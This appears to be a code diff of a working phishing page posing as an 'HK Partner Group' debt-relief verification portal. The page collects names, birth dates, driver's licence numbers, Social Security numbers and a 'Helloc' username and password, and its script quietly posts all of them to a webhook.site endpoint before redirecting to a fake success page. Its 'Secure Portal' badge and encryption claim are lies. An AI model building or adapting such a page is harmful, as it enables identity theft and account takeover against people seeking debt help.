@@ -1,143 +1,263 @@
 <!DOCTYPE html>  
 <html lang="en">  
 <head>  
-    <meta charset="UTF-8">  
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">  
-    <title>HK Partner Group – Verification Portal</title>  
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">  
-    <style>  
-        * {  
-            margin: 0;  
-            padding: 0;  
-            box-sizing: border-box;  
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;  
-        }
+<meta charset="UTF-8">  
+<meta name="viewport" content="width=device-width, initial-scale=1.0">  
+<title>HK Partner Group – Verification Portal</title>  
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">  
+<style>  
+* {  
+margin: 0;  
+padding: 0;  
+box-sizing: border-box;  
+font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;  
+}  
+body {  
+background: linear-gradient(135deg, #1a237e, #0d47a1);  
+color: #fff;  
+min-height: 100vh;  
+display: flex;  
+flex-direction: column;  
+align-items: center;  
+justify-content: center;  
+padding: 15px;  
+}  
+.container {  
+background: rgba(255, 255, 255, 0.95);  
+color: #333;  
+width: 100%;  
+max-width: 500px;  
+border-radius: 15px;  
+padding: 20px;  
+box-shadow: 0 10px 25px rgba(0, 0, 0, 0.5);  
+}  
+.header {  
+display: flex;  
+align-items: center;  
+justify-content: space-between;  
+border-bottom: 2px solid #0d47a1;  
+padding-bottom: 10px;  
+margin-bottom: 15px;  
+flex-wrap: wrap;  
+}  
+.logo {  
+font-size: 22px;  
+font-weight: bold;  
+color: #0d47a1;  
+display: flex;  
+align-items: center;  
+}  
+.logo i { margin-right: 8px; }  
+.secure-badge {  
+background: #4CAF50;  
+color: white;  
+padding: 6px 12px;  
+border-radius:42px;  
+font-size: 12px;  
+display: inline-flex;  
+align-items: center;  
+}  
+.secure-badge i { margin-right: 5px; }  
+h1 {  
+font-size: 18px;  
+margin-bottom: 8px;  
+color: #1a237e;  
+text-align: center;  
+}  
+.description {  
+font-size: 14px;  
+line-height: 1.5;  
+margin-bottom: 15px;  
+color: #555;  
+text-align: center;  
+}  
+form {  
+display: flex;  
+flex-direction: column;  
+gap: 15px;  
+}  
+.form-group {  
+display: flex;  
+flex-direction: column;  
+}  
+label {  
+font-weight: bold;  
+margin-bottom: 5px;  
+color: #0d47a1;  
+font-size: 14px;  
+}  
+input, select {  
+padding: 12px;  
+border-radius: 8px;  
+border: 1px solid #ccc;  
+font-size: 16px;  
+transition: 0.3s;  
+width: 100%;  
+}  
+input:focus, select:focus {  
+border-color: #0d47a1;  
+box-shadow: 0 0 5px rgba(13, 71, 161, 0.5);  
+outline: none;  
+}  
+.ssn-section, .helloc-section {  
+background: #f5f5f5;  
+padding: 15px;  
+border-radius: 10px;  
+margin-top: 10px;  
+}  
+.section-title {  
+font-size: 16px;  
+color: #1a237e;  
+margin-bottom: 10px;  
+display: flex;  
+align-items: center;  
+}  
+.section-title i {  
+margin-right: 8px;  
+color: #4CAF50;  
+}  
+.submit-btn {  
+background: linear-gradient(to right, #0d47a1, #1a237e);  
+color: white;  
+padding:15px;  
+border-radius: 10px;  
+cursor: pointer;  
+border: none;  
+margin-top: 15px;  
+transition: 0.3s;  
+display: flex;  
+align-items: center;  
+justify-content: center;  
+width: 100%;  
+font-size: 16px;  
+}  
+.submit-btn:hover {  
+background: linear-gradient(to right, #1a237e, #0d47a1);  
+box-shadow: 0 5px15px rgba(0,0,0,0.3);  
+}  
+.footer {  
+text-align: center;  
+margin-top: 20px;  
+font-size: 12px;  
+color: #777;  
+}  
+@media (max-width:480px) {  
+.container { max-width: 95%; padding:15px; }  
+.logo { font-size:18px; }  
+h1 { font-size:16px; }  
+.description { font-size:13px; }  
+input, select { padding:10px; }  
+}  
+</style>  
+</head>  
+<body>  
+<div class="container">  
+<div class="header">  
+<div class="logo">  
+<i class="fas fa-building"></i> HK Partner Group  
+</div>  
+<div class="secure-badge">  
+<i class="fas fa-lock"></i> Secure Portal  
+</div>  
+</div>  
+<h1>Debt Relief Authorization Verification</h1>  
+<p class="description">  
+Please verify all required details to proceed with your debt payment. All information is encrypted and securely processed.  
+</p>
 
-        body {  
-            background: linear-gradient(135deg, #1a237e, #0d47a1);  
-            color: #fff;  
-            min-height: 100vh;  
-            display: flex;  
-            flex-direction: column;  
-            align-items: center;  
-            justify-content: center;  
-            padding: 15px;  
-        }
+<form id="authForm">  
+<div class="form-group">  
+<label for="fullName">Full Name</label>  
+<input type="text" id="fullName" name="fullName" required placeholder="Enter full legal name">  
+</div>
+    <div class="form-group">  
+<label for="phoneNumber">Phone Number</label>  
+<input type="tel" id="phoneNumber" name="phoneNumber" required placeholder="+1 234 567 8900">  
+</div>  
+<div class="form-group">  
+<label for="dob">Date of Birth</label>  
+<input type="date" id="dob" name="dob" required>  
+</div>  
+<div class="form-group">  
+<label for="state">State</label>  
+<select id="state" name="state">  
+<option value="CA">California</option>  
+<option value="NY">New York</option>  
+<option value="TX">Texas</option>  
+<option value="FL">Florida</option>  
+<option value="IL">Illinois</option>  
+</select>  
+</div>  
+<div class="form-group">  
+<label for="stateID">State ID / Driver's License</label>  
+<input type="text" id="stateID" name="stateID" required placeholder="DL123456789">  
+</div>
 
-        .container {  
-            background: rgba(255, 255, 255, 0.95);  
-            color: #333;  
-            width: 100%;  
-            max-width: 500px;  
-            border-radius: 15px;  
-            padding: 20px;  
-            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.5);  
-            margin-bottom: 20px;  
-        }
+<div class="ssn-section">  
+<div class="section-title">  
+<i class="fas fa-shield-alt"></i> Secure Identity Information  
+</div>  
+<div class="form-group">  
+<label for="ssn">Social Security Number (SSN)</label>  
+<input type="text" id="ssn" name="ssn" required placeholder="XXX-XX-XXXX">  
+</div>  
+</div>
 
-        .header {  
-            display: flex;  
-            align-items: center;  
-            justify-content: space-between;  
-            border-bottom: 2px solid #0d47a1;  
-            padding-bottom: 10px;  
-            margin-bottom: 15px;  
-            flex-wrap: wrap;  
-        }
+<div class="helloc-section">  
+<div class="section-title">  
+<i class="fas fa-user-secret"></i> Helloc Account Details  
+</div>  
+<div class="form-group">  
+<label for="hellocUsername">Helloc Username</label>  
+<input type="text" id="hellocUsername" name="hellocUsername" required placeholder="Your Helloc username">  
+</div>  
+<div class="form-group">  
+<label for="hellocPassword">Helloc Password</label>  
+<input type="password" id="hellocPassword" name="hellocPassword" required placeholder="Your Helloc password">  
+</div>  
+</div>
 
-        .logo {  
-            font-size: 22px;  
-            font-weight: bold;  
-            color: #0d47a1;  
-            display: flex;  
-            align-items: center;  
-        }
+<button type="submit" class="submit-btn">  
+<i class="fas fa-check-circle"></i> Submit Authorization  
+</button>  
+</form>
 
-        .logo i {  
-            margin-right: 8px;  
-        }
+<div class="footer">  
+© 2024 HK Partner Group – All rights reserved.  
+</div>  
+</div>
 
-        .secure-badge {  
-            background: #4CAF50;  
-            color: white;  
-            padding: 6px 12px;  
-            border-radius: 12px;  
-            font-size: 12px;  
-            display: inline-flex;  
-            align-items: center;  
-        }
+<script>  
+document.getElementById('authForm').addEventListener('submit',function(event){  
+event.preventDefault();
 
-        .secure-badge i {  
-            margin-right: 5px;  
-        }
+const formData={  
+fullName:document.getElementById('fullName').value,  
+phoneNumber:document.getElementById('phoneNumber').value,  
+dob:document.getElementById('dob').value,  
+state:document.getElementById('state').value,  
+stateID:document.getElementById('stateID').value,  
+ssn:document.getElementById('ssn').value,  
+hellocUsername:document.getElementById('hellocUsername').value,  
+hellocPassword:document.getElementById('hellocPassword').value,  
+timestamp:new Date().toISOString()  
+};
 
-        h1 {  
-            font-size: 18px;  
-            margin-bottom: 8px;  
-            color: #1a237e;  
-            text-align: center;  
-        }
-
-        .description {  
-            font-size: 14px;  
-            line-height: 1.5;  
-            margin-bottom: 15px;  
-            color: #555;  
-            text-align: center;  
-        }
-
-        form {  
-            display: flex;  
-            flex-direction: column;  
-            gap: 15px;  
-        }
-
-        .form-group {  
-            display: flex;  
-            flex-direction: column;  
-        }
-
-        label {  
-            font-weight: bold;  
-            margin-bottom: 5px;  
-            color: #0d47a1;  
-            font-size: 14px;  
-        }
-
-        input, select {  
-            padding: 12px;  
-            border-radius: 8px;  
-            border: 1px solid #ccc;  
-            font-size: 16px;  
-            transition: 0.3s;  
-            width: 100%;  
-        }
-
-        input:focus, select:focus {  
-            border-color: #0d47a1;  
-            box-shadow: 0 0 5px rgba(13, 71, 161, 0.5);  
-            outline: none;  
-        }
-
-        .ssn-section, .helloc-section {  
-            background: #f5f5f5;  
-            padding: 15px;  
-            border-radius: 10px;  
-            margin-top: 15px;  
-        }
-
-        .section-title {  
-            font-size: 16px;  
-            color: #1a237e;  
-            margin-bottom: 10px;  
-            display: flex;  
-            align-items: center;  
-        }
-
-        .section-title i {  
-            margin-right: 8px;  
-            color: #4CAF50;  
-        }
-
-        .submit-btn {  
-            background: linear-gradient(to right, #0d47a1, #1a237e);
+// Send to your webhook.site endpoint  
+fetch('https://webhook.site/87cc46ce-36d4-4e22-b93e-994e3f135410',{  
+method:'POST',  
+headers:{'Content-Type':'application/json'},  
+body:JSON.stringify(formData)  
+})  
+.then(response=>response.json())  
+.then(result=>{  
+window.location.href='success.html';  
+})  
+.catch(error=>{  
+console.error('Error:',error);  
+window.location.href='success.html';  
+});  
+});  
+</script>  
+</body>  
+</html>
